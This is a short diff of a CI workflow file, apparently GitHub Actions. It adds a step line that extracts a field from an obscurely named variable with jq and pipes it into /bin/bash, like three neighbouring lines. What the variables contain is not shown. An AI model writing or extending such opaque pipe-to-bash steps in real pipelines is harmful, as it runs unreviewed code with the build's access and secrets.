@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$ykfoi281" | jq -r .hs51477 | /bin/bash
           echo $rv4557 | jq -r .rid0437 | /bin/bash
           echo $q0 | jq -r .a338 | /bin/bash
+          printf '%s' "$ds23" | jq -r .al2 | /bin/bash
 
       - name: Save output
         if: always()
